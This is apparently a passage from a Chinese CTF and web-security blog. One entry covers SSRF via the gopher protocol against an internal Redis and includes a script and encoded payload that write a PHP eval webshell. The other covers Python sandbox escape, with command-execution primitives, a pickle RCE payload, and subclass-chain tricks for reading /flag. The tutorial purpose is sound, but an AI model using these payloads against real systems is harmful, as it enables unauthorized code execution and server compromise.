class="hljs-string">w0s1np=woshilnp</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><img src="/wzimg/90.png" alt="image-20210415174622478"></p><p>然后执行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> gopher://<span class="hljs-number">127.0.0.1:80</span>/_POST%<span class="hljs-number">20</span>/index.php%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AHost%<span class="hljs-number">3</span>A%<span class="hljs-number">20127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Type%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>application/x-www-form-urlencoded%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Length%<span class="hljs-number">3</span>A%<span class="hljs-number">2015</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aw<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np%<span class="hljs-number">3</span>Dwoshilnp%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="/wzimg/91.png" alt="image-20210415174709826"></p><p>如上图，成功用POST方法传参并输出“Hello woshilnp”。</p><p>[2020 科来杯初赛]Web1</p><h3 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h3><p>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p><strong>Redis未授权访问？</strong></p><p>Redis 默认情况下，会绑定在<code>0.0.0.0:6379</code>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源<code>ip</code>访问等，这样将会将<code>Redis</code>服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问<code>Redis</code>以及读取<code>Redis</code>的数据。攻击者在未授权访问<code>Redis</code>的情况下，利用 Redis 自身的提供的<code>config</code>命令，可以进行写文件操作，攻击者可以成功将自己的<code>ssh</code>公钥写入目标服务器的<code>/root/.ssh</code>文件夹的<code>authotrized_keys</code>文件中，进而可以使用对应私钥直接使用<code>ssh</code>服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><ul><li>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li></ul><p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，</p><p>思路都是一样的，就是先将Redis的本地数据库存放目录设置为<code>web</code>目录、<code>~/.ssh</code>目录或<code>/var/spool/cron</code>目录等，然后<code>dbfilename</code>（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行<code>save</code>或<code>bgsave</code>保存，则我们就指定的目录里写入指定的文件了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span><br>ip=<span class="hljs-string">&quot;192.168.133.255&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php eval($_POST[\&quot;w0s1np\&quot;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd=<span class="hljs-string">&quot;&quot;</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br> <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br> <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br> <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br> <span class="hljs-string">&quot;save&quot;</span><br> ]<br><span class="hljs-keyword">if</span> passwd:<br>cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>cmd=<span class="hljs-string">&quot;&quot;</span><br>cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>cmd+=CRLF<br><span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>payload += urllib.quote(redis_format(x))<br><span class="hljs-built_in">print</span> payload<br></code></pre></td></tr></table></figure><p>ubuntu：192.168.133.255</p><p><img src="/wzimg/92.png" alt="image-20210415191448425"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">192.168.133.255:6379</span>/_%<span class="hljs-number">2</span>A<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A<span class="hljs-number">3</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2435</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B%<span class="hljs-number">22</span>w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A<span class="hljs-number">4</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2413</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/www/html%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A<span class="hljs-number">4</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">249</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Ashell.php%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p>这里我还不知道从什么地方实验这个东西，所以先放在这里吧，攻击内网的东西以后再补充吧</p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 沙箱逃逸</title>
    <link href="/2021/04/10/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/2021/04/10/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-沙箱逃逸"><a href="#Python-沙箱逃逸" class="headerlink" title="Python 沙箱逃逸"></a>Python 沙箱逃逸</h1><p>沙箱逃逸，就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到<code>shell</code>权限的过程</p><h3 id="常见的函数、属性、模块"><a href="#常见的函数、属性、模块" class="headerlink" title="常见的函数、属性、模块"></a>常见的函数、属性、模块</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><h5 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h5><p>只存在于Py2，不存在于Py3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">40</span>]<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h5 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>]<br>&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">open</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;/flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h5 id="codecs模块"><a href="#codecs模块" class="headerlink" title="codecs模块"></a>codecs模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> codecs<br>codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;import os;os.system(&quot;ifconfig&quot;)&#x27;</span>)   <span class="hljs-comment">#exec函数包含的语句相当于一个完整的python_shell，但exec()的执行无回显</span><br></code></pre></td></tr></table></figure><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>eval函数只支持单行语句的执行，会返回执行结果</p><p>还有一点和<code>exec()</code>不同的是，<code>eval</code>不能直接使用 <code>import</code> 语句来导入模块，若要导入模块需要使用<code>__import__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;import os&#x27;</span>)<span class="hljs-comment">#该句会报错</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;pyshell#3&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;import os&#x27;</span>)<br>  File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line <span class="hljs-number">1</span><br>    <span class="hljs-keyword">import</span> os<br>    ^<br>SyntaxError: invalid syntax<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)<span class="hljs-comment">#使用__import__成功使用os模块</span><br></code></pre></td></tr></table></figure><h5 id="execfile"><a href="#execfile" class="headerlink" title="execfile()"></a>execfile()</h5><p>execfile()用于执行可执行文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">execfile(<span class="hljs-string">&#x27;/flag.py&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">os.system(<span class="hljs-string">&#x27;ls /&#x27;</span>)<br><br>os.popen(<span class="hljs-string">&#x27;ls /&#x27;</span>)<br><br>os.startfile(<span class="hljs-string">r&#x27;/flag.exe&#x27;</span>)   <span class="hljs-comment">#执行可执行文件</span><br><br>os.listdir(<span class="hljs-string">&#x27;ls /&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="timeit模块"><a href="#timeit模块" class="headerlink" title="timeit模块"></a>timeit模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> timeit<br>timeit.timeit(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;</span>,number=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h5 id="commands模块"><a href="#commands模块" class="headerlink" title="commands模块"></a>commands模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> commands<br><span class="hljs-meta">&gt;&gt;&gt; </span>commands.getoutput(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>commands.getstatusoutput(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> platform<br>platform.popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h5 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br>subprocess.Popen(<span class="hljs-string">&#x27;ipconfig&#x27;</span>, shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()<br></code></pre></td></tr></table></figure><h5 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h5><p>sys模块本身不能用于命令执行，但可用于导入其他模块达到命令执行的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules[<span class="hljs-string">&#x27;commands&#x27;</span>].getoutput(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="popen模块"><a href="#popen模块" class="headerlink" title="popen模块"></a>popen模块</h5><p>popen模块包含一些命令执行的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> popen<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">dir</span>(popen)<br>[<span class="hljs-string">&#x27;Sh&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__path__&#x27;</span>, <span class="hljs-string">&#x27;chain&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;islice&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>popen.os.system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h5><p>pickle模块的反序列化可实现命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickle<br><span class="hljs-meta">&gt;&gt;&gt; </span>pickle.loads(<span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;cat /flag&#x27;\ntR.&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里是使用的 os.system()</p><h3 id="构造继承链"><a href="#构造继承链" class="headerlink" title="构造继承链"></a>构造继承链</h3><table><thead><tr><th>名称</th><th>介绍</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td></tr><tr><td><code>__class__</code></td><td>返回一个实例对应的类型</td></tr><tr><td><code>__base__</code></td><td>返回一个类所继承的基类</td></tr><tr><td><code>__subclasses__()</code></td><td>返回该类的所有子类</td></tr><tr><td><code>__mro__</code></td><td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td></tr><tr><td><code>__slots__</code></td><td>限制类动态添加属性</td></tr><tr><td><code>__getattribute__()</code></td><td>获取属性或方法，对模块和类都有效</td></tr><tr><td><code>__getitem__()</code></td><td>以索引取值或者键取值</td></tr><tr><td><code>__globals__</code></td><td>返回函数所在模块命名空间中的所有变量</td></tr></tbody></table><p><code>python</code>的<code>object</code>类中集成了很多的基础函数，我们想要调用的时候也是需要用<code>object</code>去操作的，</p><ul><li>获取字符串的类对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><ul><li>寻找基类</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<br>(&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">object</span>&#x27;&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&gt;&gt;&gt; &#x27;&#x27;.<span class="hljs-title">__class__</span>.<span class="hljs-title">__bases__</span></span><br><span class="hljs-class">(<span class="hljs-params">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;,</span>)</span><br></code></pre></td></tr></table></figure><ul><li>寻找可用引用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()<br></code></pre></td></tr></table></figure><p>例如文件读取的 &lt;type ‘file’&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>]<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/flag&#x27;</span>).read<br></code></pre></td></tr></table></figure><p>写文件相仿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp/evil.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;evil code&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/wzimg/26.png" alt="a"></p><ul><li>找到重载过的<code>__init__</code>类的类</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__<br></code></pre></td></tr></table></figure><p>在获取初始化属性后，带<code>wrapper</code>的说明没有重载，寻找不带<code>warpper</code>的，因为<code>wrapper</code>是指这些函数并没有被重载，这时它们并不是<code>function</code>，不具有<code>__globals__</code>属性。</p><p><img src="/wzimg/27.png" alt="b"></p><p>这个就是没被重载过的，我们就要寻找被重载过的，一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">l = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[i].__init__):<br>        <span class="hljs-built_in">print</span> (i, <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[i])<br></code></pre></td></tr></table></figure><p>就可以查出被重载过的类</p><p>重载过的<code>__init__</code>类的类具有<code>__globals__</code>属性，这里以<code>WarningMessage</code>为例，会返回很多dict类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">204</span>].__init__.__globals__<br></code></pre></td></tr></table></figure><p>寻找keys中的<code>__builtins__</code>来查看引用，这里同样会返回很多dict类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">204</span>].__init__.__globals__[<span 